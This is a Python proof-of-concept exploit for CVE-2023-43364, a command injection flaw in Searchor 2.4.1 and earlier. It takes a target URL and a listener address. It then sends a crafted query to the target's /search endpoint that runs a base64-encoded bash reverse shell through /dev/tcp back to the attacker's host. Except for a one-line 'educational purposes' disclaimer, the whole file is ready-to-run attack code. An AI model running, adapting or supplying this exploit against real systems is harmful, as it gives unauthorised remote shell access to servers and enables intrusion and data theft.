#!/usr/bin/env python3
# This is an exploit code written for the Arbitrary Command Injection exploit in Searchor <=2.4.1.
# This POC is written for educational purposes only.

import argparse
import requests
import base64

def remoteCodeExecution(t_url, r_host, r_port):
    target = f"{t_url}/search"
    rce_code = f"bash -c 'bash -i >& /dev/tcp/{r_host}/{r_port} 0>&1'"
    b64_rce_code = base64.b64encode(rce_code.encode('utf-8')).decode('utf-8')
    payload = f"' + __import__('os').popen('echo {b64_rce_code}|base64 -d|bash -i').read() + '"

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "71",
        "Connection": "keep-alive"
    }

    data = {
        "engine": "Amazon",
        "query": payload
    }
    
    try:
        response_1 = requests.get(t_url)

        if response_1.status_code == 200:
            print("Connection Established Successfully.")
            print(f"Trying to open a reverse shell on {r_host} at {r_port}...")
    except requests.exceptions.RequestException as e:
        print(f"An error occured: {e}")

    try:
        response = requests.post(target, headers=headers, data=data)

        if response.status_code == 200:
            print("Enjoy the reverse shell.")
        else:
            print("Connection cannot be established. Please check and try again.")
    except requests.exceptions.RequestException as e:
        print(f"An error occured: {e}")


def main():
    parser = argparse.ArgumentParser(description="Simple POC for CVE-2023-43364 with RCE.")

    # Add arguments
    parser.add_argument('-u', '--url', required=True, help="Target URL")
    parser.add_argument('-rh', '--rhost', required=True, help="Reverse Shell IP")
    parser.add_argument('-rp', '--rport', required=True, help="Reverse Shell port")

    # Parse the arguments
    args = parser.parse_args()

    target_url = args.url
    reverse_shell_ip = args.rhost
    reverse_shell_port = args.rport

    remoteCodeExecution(target_url, reverse_shell_ip, reverse_shell_port)

if __name__ == "__main__":
    main()
